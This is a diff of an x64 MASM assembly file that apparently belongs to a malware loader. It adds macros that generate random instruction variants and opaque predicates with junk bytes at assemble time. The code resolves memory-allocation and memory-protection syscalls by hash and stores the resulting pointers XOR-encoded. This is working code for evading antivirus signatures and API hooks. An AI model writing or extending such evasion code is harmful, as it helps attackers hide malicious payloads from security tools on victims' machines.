@@ -130,9 +130,10 @@ s_shl           equ 0xe0c1                  ; shl                               
 ; credit to mabdelouahab@masm32.com                                             ;
 rnd macro __mask                                                                ;
     local m                                                                     ;
-    m=(@SubStr(%@Time,7,2)+@Line)*(@SubStr(%@Date,1,2))                         ;
-    m=(m+@SubStr(%@Date,4,2)*100+@SubStr(%@Date,7,2))* (-1001)                   ;
+    m=(@SubStr(%@Time,7,2)+@Line)*(@SubStr(%@Date,1,2))                     ;
+    m=(m+@SubStr(%@Date,4,2)*100+@SubStr(%@Date,7,2))* (-1001)            ;
     m=(m+@SubStr(%@Time,1,2)+@SubStr(%@Time,4,2))*(@SubStr(%@Time,7,2)+1)       ;
+
     ifnb <__mask>                                                               ;
         m = m and __mask                                                        ;
     endif                                                                       ;
@@ -152,40 +153,79 @@ emit_jmp_rel8 macro dist                                                        
     db dist                                                                     ;
 endm                                                                            ;
 
+; Get high bytes of a DWORD
 dword_hi macro val
     local p
     p = ((val) and 0xffff0000)
     exitm % p
 endm
 
+; Get low bytes of a DWORD
 dword_lo macro val
     local p
     p = ((val) and 0x0000ffff)
     exitm % p
 endm
 
+; Set a target register to a target hash. Code generated at assemble time based
+; on four variants.
 sethash macro reg, hash
     local   choice 
     choice  = (rnd(0x03))
     if choice eq 0
-        echo 0
         mov     reg, dword_hi(hash)
         or      reg, dword_lo(hash)
         mov     reg, hash
     elseif choice eq 1
-        echo 1
         xor     reg, reg
         mov     reg, (dword_hi(hash) shr 8)
         shl     reg, 8
         and     reg, reg
         or      reg, dword_lo(hash)
     elseif choice eq 2
-        echo 2
         mov     reg, (hash xor choice)
         xor     reg, choice
     elseif choice eq 3
-        echo 3
         mov     reg, hash
+    endif
+endm
+
+; Clear out volatile registers. Generate one of three variants
+; at assemble time. Two variants include opaque predicates.
+clobber_regs macro
+    local   choice, l1, l2, l3, l4, l5, l6
+    choice  = (rnd(0x02))
+    if choice eq 0
+        mov     ecx, 0
+        and     ecx, 0x00
+        jz      l2
+    l1: 
+        byte    rnd(0xff)
+        byte    (rnd(0xff) xor 0x10)
+    l2: mov     edx, 0
+        cmp     ecx, edx
+        jne     l1
+        xor     r8, r8
+        add     r8d, ecx
+        mov     r9, rdx
+    elseif choice eq 1
+        mov     ecx, 0
+        mov     edx, ecx
+        mov     r9, rcx
+        mov     r8, r9
+    elseif choice eq 2
+        mov     edx, 0
+        and     ecx, 0xff
+        cmp     ecx, edx
+        jnz     l4
+    l3: jmp     l5
+    l4: and     r8d, edx
+        mov     r9, r8
+        jmp     l6
+    l5: jmp     l4
+    l6: cmp     edx, 0
+        jnz     l3
+        mov     ecx, 0
     endif
 endm
 
@@ -201,8 +241,8 @@ endm
 ;                                                                               ;
 static_rnd macro __mask                                                         ;
     local m                                                                     ;
-    m=(@SubStr(%@Time,7,2))*(@SubStr(%@Date,1,2))                         ;
-    m=(m+@SubStr(%@Date,4,2)*100+@SubStr(%@Date,7,2))* (-1001)                   ;
+    m=(@SubStr(%@Time,7,2))*(@SubStr(%@Date,1,2))                         
+    m=(m+@SubStr(%@Date,4,2)*100+@SubStr(%@Date,7,2))* (-1001)                
     m=(m+@SubStr(%@Time,1,2)+@SubStr(%@Time,4,2))*(@SubStr(%@Time,7,2)+1)       ;
     ifnb <__mask>                                                               ;
         m = m and __mask                                                        ;
@@ -274,7 +314,6 @@ text segment align(16) 'code' read execute ;                                   ;
 ;
 start proc fastcall
     local   dimp:dynimp
-
     sethash rax, hash_ntavm
     mov     rcx, dimp
     invoke  setup_syscalls, rcx
@@ -328,6 +367,7 @@ _set_ntavm:
 _set_ntpvm:
     xor     rax, random_mask                ; encode it                         ;
     mov     [dimp].dynimp.ntpvm, rax        ; store in dynamic import table     ;
+    clobber_regs
     mov     rbx, @rbx
     mov     rsi, @rsi                   
     mov     rdi, @rdi
@@ -560,39 +600,6 @@ _done:
     mov     rsi, @rsi
     mov     rbx, @rbx
     ret
-;     ; mov     rsi, src
-;     ; mov     rdi, buf
-;     ; mov     ebx, len
-;     ; xor     r10, r10
-; ; _loop:
-;     ; xor     eax, eax
-;     ; mov     tmp, rax
-;     ; mov     eax, r10d
-;     ; add     eax, ebx
-;     ; cmp     eax, [max]
-;     ;pop     rax
-;     mov     rax, tmp
-;     ; ja      _done
-;     ; cmp     r10d, max
-;     ; mov     rcx, rsi
-;     ; mov     rdx, rdi
-;     ; inc     r10
-;     ; inc     rsi
-;     ; mov     r8, rbx
-;     ; mov     tmp2, r9
-;     ; call    memcmp
-;     mov     r9, tmp2
-;     test    eax, eax
-;     jz      _loop
-; _match:
-;     dec     rsi
-;     mov     rax, rsi
-; _done:
-;     mov     rdi, @rdi
-;     mov     rdi, @rdi
-;     mov     rsi, @rsi
-;     mov     rbx, @rbx
-;     ret
 find_bytes endp
 
 ; ----------------------------------------- ;
